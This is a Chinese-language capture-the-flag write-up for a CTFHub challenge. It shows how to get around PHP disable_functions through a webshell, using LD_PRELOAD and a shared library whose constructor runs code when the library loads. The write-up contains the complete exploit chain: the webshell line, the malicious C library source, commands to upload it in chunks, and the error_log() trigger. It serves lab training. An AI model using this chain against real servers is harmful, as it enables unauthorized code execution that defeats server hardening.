# CTFHub Bypass disable_function - LD_PRELOAD

## 题目信息

- 平台：CTFHub
- 类型：Bypass disable_function
- 技术点：PHP WebShell、disable_functions、LD_PRELOAD、共享库构造函数
- 目标入口：`@eval($_REQUEST['ant']);`
- 最终 flag：`ctfhub{3b5800e230edfd2d817c54e9}`

## 解题思路

页面源码中存在：

```php
@eval($_REQUEST['ant']);
show_source(__FILE__);
```

因此可以通过 `ant` 参数执行 PHP 代码：

```bash
curl -G "$TARGET" --data-urlencode "ant=echo 'test';"
```

但环境禁用了大量命令执行函数，例如：

```text
system, exec, shell_exec, popen, proc_open, passthru, mail
```

不能直接执行 `/readflag`。本题利用 `LD_PRELOAD`：让 PHP 间接启动的外部程序加载我们上传的 `.so`，在共享库构造函数中执行 `/readflag`，并将结果写到 `/tmp/result.txt`。

## 关键知识点

### 1. LD_PRELOAD

`LD_PRELOAD` 是 Linux 动态链接器使用的环境变量。程序启动时，会优先加载该变量指定的共享库。

如果共享库中定义了构造函数：

```c
__attribute__((constructor))
void init(void) {
    ...
}
```

那么共享库被加载时，`init()` 会自动执行。

### 2. 为什么不能在 macOS 编译

macOS 编译出的动态库格式是 `Mach-O`：

```text
Mach-O 64-bit dynamically linked shared library x86_64
```

Linux 靶机需要 `ELF`：

```text
ELF 64-bit LSB shared object, x86-64
```

所以需要在 Kali/Linux 环境中编译 `.so`。

### 3. 为什么不能直接读 /flag

本环境根目录下存在：

```text
/flag
/readflag
```

直接读取 `/flag` 失败，最终需要执行 `/readflag` 获取 flag。

## Payload 源码

文件：`ctfhub_ldpreload.c`

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

__attribute__((constructor))
void init(void) {
    unsetenv("LD_PRELOAD");

    int fd = open("/tmp/result.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        return;
    }

    dup2(fd, 1);
    dup2(fd, 2);
    close(fd);

    execl("/readflag", "readflag", NULL);
}
```

## Kali 编译

```bash
gcc -fPIC -shared -o ctfhub_ldpreload.so ctfhub_ldpreload.c
file ctfhub_ldpreload.so
sha256sum ctfhub_ldpreload.so
base64 -w 0 ctfhub_ldpreload.so > ctfhub_ldpreload.so.b64
```

`file` 应输出类似：

```text
ctfhub_ldpreload.so: ELF 64-bit LSB shared object, x86-64
```

## 上传 .so 到靶机

由于 `.so` 是二进制文件，先 base64，再分块上传：

```bash
TARGET='http://challenge-3768e0286f400b2f.sandbox.ctfhub.com:10800/'

rm -f chunk_*

curl -G "$TARGET" --data-urlencode "ant=@unlink('/tmp/p.b64');@unlink('/tmp/p.so');@unlink('/tmp/result.txt');echo 'clean';"

split -b 1500 ctfhub_ldpreload.so.b64 chunk_

for f in chunk_*; do
  part=$(cat "$f")
  curl -s -G "$TARGET" --data-urlencode "ant=file_put_contents('/tmp/p.b64','$part',FILE_APPEND);echo filesize('/tmp/p.b64');"
  echo
done
```

远程解码并校验：

```bash
curl -G "$TARGET" --data-urlencode "ant=\$b=file_get_contents('/tmp/p.b64');file_put_contents('/tmp/p.so',base64_decode(\$b));echo 'sha256='.hash_file('sha256','/tmp/p.so').PHP_EOL;echo 'size='.filesize('/tmp/p.so').PHP_EOL;"
```

本地和远程 `sha256` 必须一致，否则说明上传损坏。

## 触发 LD_PRELOAD

本题中 `mail()` 被禁用，但 `error_log()` 可用：

```bash
curl -G "$TARGET" --data-urlencode "ant=putenv('LD_PRELOAD=/tmp/p.so');error_log('x',1,'a@b.c');echo 'triggered';"
```

然后读取输出：

```bash
curl -G "$TARGET" --data-urlencode "ant=echo @file_get_contents('/tmp/result.txt');"
```

得到：

```text
ctfhub{3b5800e230edfd2d817c54e9}
```

## 踩坑记录

1. 目标地址一开始用错，导致操作的是旧环境。
2. macOS 编译出的 `.so` 是 Mach-O，Linux 不能加载。
3. heredoc 的 `EOF` 前面不能有空格，否则 shell 会一直停在 `heredoc>`。
4. 上传二进制 `.so` 时不能直接塞进 URL 参数，应 base64 后分块上传。
5. 远程 `/tmp/p.so` 的 hash 必须和本地一致。
6. 旧 payload 只读 `/flag`，本题真正需要执行 `/readflag`。

## 总结

这题不是直接绕过 `disable_functions` 执行命令，而是利用 `LD_PRELOAD` 让 PHP 间接启动的外部程序加载恶意共享库。共享库加载时自动执行构造函数，构造函数中执行 `/readflag` 并把结果写入 `/tmp/result.txt`，最后再通过 PHP 读取该文件。

## 原理补充

### `@eval($_REQUEST['ant']);` 为什么是入口

这行代码的意思是：从 HTTP 请求里取名为 `ant` 的参数，把它当作 PHP 代码执行。

```php
$_REQUEST['ant']
```

表示从请求参数中取 `ant`，通常包括 GET、POST、Cookie 参数。

例如访问：

```text
/?ant=echo "hello";
```

那么：

```php
$_REQUEST['ant']
```

取到的内容就是：

```php
echo "hello";
```

再经过：

```php
eval($_REQUEST['ant']);
```

就等价于执行：

```php
eval('echo "hello";');
```

页面会输出：

```text
hello
```

前面的 `@` 是 PHP 错误抑制符：

```php
@eval(...)
```

意思是执行时报 warning 或 error 时尽量不显示错误信息。

所以这段代码本质上就是一个极简 WebShell：

```php
<?php
@eval($_REQUEST['ant']);
?>
```

本题后续写文件、设置环境变量、触发 `LD_PRELOAD`，本质都是通过 `ant=` 传 PHP 代码进去执行。

### `LD_PRELOAD` 是什么

`LD_PRELOAD` 是 Linux 动态链接器的环境变量。

它的作用是：在程序启动时，强制优先加载指定的共享库 `.so` 文件。

普通情况下，一个程序运行时会加载自己需要的库，例如：

```text
libc.so.6
libpthread.so
libm.so
```

如果设置：

```bash
LD_PRELOAD=/tmp/p.so
```

再启动某个动态链接程序：

```bash
LD_PRELOAD=/tmp/p.so /bin/ls
```

系统会先加载：

```text
/tmp/p.so
```

再加载程序原本需要的库。

如果 `/tmp/p.so` 中有构造函数：

```c
__attribute__((constructor))
void init(void) {
    // 这里的代码会在程序 main 函数之前执行
}
```

那么只要 `.so` 被加载，`init()` 就会自动执行。

一句话理解：`LD_PRELOAD` 就是让 Linux 程序启动时先加载指定的动态库，而我们利用这个机制让自己的代码在外部程序启动时自动运行。

### 本题中如何实现 `LD_PRELOAD`

本题的完整链路如下：

1. 页面存在 PHP 代码执行入口：

```php
@eval($_REQUEST['ant']);
```

所以可以通过 `ant=` 传 PHP 代码。

2. 在 Kali 中编译 Linux ELF 格式的 `.so`：

```bash
gcc -fPIC -shared -o ctfhub_ldpreload.so ctfhub_ldpreload.c
```

这个 `.so` 中写了构造函数：

```c
__attribute__((constructor))
void init(void) {
    unsetenv("LD_PRELOAD");

    int fd = open("/tmp/result.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        return;
    }

    dup2(fd, 1);
    dup2(fd, 2);
    close(fd);

    execl("/readflag", "readflag", NULL);
}
```

意思是：只要这个 `.so` 被加载，就自动执行 `/readflag`，并把输出写到：

```text
/tmp/result.txt
```

3. 通过 base64 分块上传 `.so`。

先在本地编码：

```bash
base64 -w 0 ctfhub_ldpreload.so > ctfhub_ldpreload.so.b64
```

再通过 PHP 分块追加写到靶机：

```php
file_put_contents('/tmp/p.b64', $part, FILE_APPEND);
```

最后在靶机解码：

```php
file_put_contents('/tmp/p.so', base64_decode(file_get_contents('/tmp/p.b64')));
```

这样靶机上就有了：

```text
/tmp/p.so
```

4. 通过 PHP 设置环境变量：

```php
putenv('LD_PRELOAD=/tmp/p.so');
```

这一步告诉后续启动的动态链接程序：

```text
启动时先加载 /tmp/p.so
```

5. 用 `error_log()` 间接触发外部程序启动。

本题中 `system`、`exec`、`mail` 等函数被禁用，但 `error_log()` 可用：

```php
error_log('x', 1, 'a@b.c');
```

这种用法会尝试通过邮件系统发送日志，底层会调用外部 sendmail 程序。外部程序启动时会继承 PHP 进程中的环境变量：

```text
LD_PRELOAD=/tmp/p.so
```

于是动态链接器加载 `/tmp/p.so`。

6. `/tmp/p.so` 被加载后，构造函数自动执行 `/readflag`，并写入：

```text
/tmp/result.txt
```

7. 最后通过 PHP 读取结果：

```bash
curl -G "$TARGET" --data-urlencode "ant=echo @file_get_contents('/tmp/result.txt');"
```

最终得到 flag：

```text
ctfhub{3b5800e230edfd2d817c54e9}
```

本题的核心不是直接执行命令，而是通过 `LD_PRELOAD` 把命令执行逻辑放进 `.so` 的自动执行构造函数里，再让 PHP 间接启动外部程序来加载这个 `.so`。
